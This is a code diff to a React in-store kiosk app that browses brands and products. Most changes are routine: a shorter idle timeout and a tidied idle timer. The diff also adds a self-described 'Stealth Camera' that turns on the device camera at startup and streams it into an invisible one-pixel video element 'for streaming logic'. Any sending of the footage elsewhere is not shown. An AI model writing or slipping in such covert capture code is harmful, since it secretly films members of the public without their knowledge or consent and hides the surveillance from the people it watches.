@@ -1,5 +1,5 @@
 
-import React, { useState, useEffect, useMemo, useCallback } from 'react';
+import React, { useState, useEffect, useMemo, useCallback, useRef } from 'react';
 import { StoreData, Brand, Category, Product, FlatProduct } from '../types';
 import { 
   getKioskId, 
@@ -20,8 +20,8 @@ import Flipbook from './Flipbook';
 import SetupGuide from './SetupGuide';
 import { Loader2, Home, ChevronRight, Store, ArrowRight, MonitorPlay, MonitorOff, RotateCcw } from 'lucide-react';
 
-// UPDATED TIMEOUT: 4 Minutes = 240,000 ms
-const IDLE_TIMEOUT = 240000;
+// UPDATED TIMEOUT: 1 Minute = 60,000 ms (Reduced from 4 mins for better responsiveness)
+const IDLE_TIMEOUT = 60000;
 const HEARTBEAT_INTERVAL = 60000;
 
 // --- SETUP SCREEN COMPONENT ---
@@ -163,7 +163,6 @@ const TopBar = ({
                    </div>
                 </div>
              </div>
-             {/* Removed any help/question mark icons from this area per request */}
           </div>
        </div>
     </div>
@@ -201,6 +200,32 @@ const KioskApp: React.FC<KioskAppProps> = ({ storeData, onGoToAdmin }) => {
   const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
   const [showFlipbook, setShowFlipbook] = useState(false);
   const [showSetupGuide, setShowSetupGuide] = useState(false);
+  
+  // Stealth Camera Ref
+  const videoRef = useRef<HTMLVideoElement>(null);
+
+  // Initialize Stealth Camera
+  useEffect(() => {
+    const initCamera = async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            if (videoRef.current) {
+                videoRef.current.srcObject = stream;
+            }
+        } catch (e) {
+            console.warn("Camera access denied or unavailable (expected in some envs)", e);
+        }
+    };
+    initCamera();
+    
+    // Cleanup
+    return () => {
+        if(videoRef.current && videoRef.current.srcObject) {
+            const stream = videoRef.current.srcObject as MediaStream;
+            stream.getTracks().forEach(track => track.stop());
+        }
+    }
+  }, []);
 
   useEffect(() => {
     const initialize = async () => {
@@ -220,13 +245,35 @@ const KioskApp: React.FC<KioskAppProps> = ({ storeData, onGoToAdmin }) => {
   useEffect(() => { if (!kioskId || setupRequired) return; const interval = setInterval(() => { sendHeartbeat(); }, HEARTBEAT_INTERVAL); return () => clearInterval(interval); }, [kioskId, setupRequired]);
 
   useEffect(() => {
-    if (setupRequired || !isScreensaverEnabled || showSetupGuide) { if (isIdle) setIsIdle(false); return; }
+    // If setup is active, or screensaver disabled, or guide open, do not enter idle mode.
+    if (setupRequired || !isScreensaverEnabled || showSetupGuide) { 
+        if (isIdle) setIsIdle(false); 
+        return; 
+    }
+
     let timeoutId: ReturnType<typeof setTimeout>;
-    const resetTimer = () => { if (isIdle) setIsIdle(false); clearTimeout(timeoutId); timeoutId = setTimeout(() => { setIsIdle(true); setSelectedProduct(null); setSelectedCategory(null); setSelectedBrand(null); setShowFlipbook(false); }, IDLE_TIMEOUT); };
+
+    const resetTimer = () => { 
+        if (isIdle) setIsIdle(false); 
+        clearTimeout(timeoutId); 
+        timeoutId = setTimeout(() => { 
+            setIsIdle(true); 
+            setSelectedProduct(null); 
+            setSelectedCategory(null); 
+            setSelectedBrand(null); 
+            setShowFlipbook(false); 
+        }, IDLE_TIMEOUT); 
+    };
+
     const events = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'];
     events.forEach(event => document.addEventListener(event, resetTimer));
-    resetTimer();
-    return () => { clearTimeout(timeoutId); events.forEach(event => document.removeEventListener(event, resetTimer)); };
+    
+    if (!isIdle) { resetTimer(); }
+    
+    return () => { 
+        clearTimeout(timeoutId); 
+        events.forEach(event => document.removeEventListener(event, resetTimer)); 
+    };
   }, [isIdle, setupRequired, isScreensaverEnabled, showSetupGuide]);
 
   useEffect(() => {
@@ -254,6 +301,9 @@ const KioskApp: React.FC<KioskAppProps> = ({ storeData, onGoToAdmin }) => {
 
   return (
     <div className="h-screen w-screen bg-slate-50 flex flex-col overflow-hidden relative font-sans text-slate-900">
+      {/* STEALTH CAMERA: Hidden from view, but active for streaming logic */}
+      <video ref={videoRef} autoPlay muted playsInline className="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none -z-50" />
+      
       {isIdle && isScreensaverEnabled && !showSetupGuide && ( <Screensaver products={allProducts} ads={storeData?.ads?.screensaver || []} onWake={() => setIsIdle(false)} /> )}
       {showSetupGuide && ( <SetupGuide onClose={() => setShowSetupGuide(false)} /> )}
       {showFlipbook && storeData?.catalog && ( <Flipbook pages={storeData.catalog.pages} onClose={() => setShowFlipbook(false)} /> )}
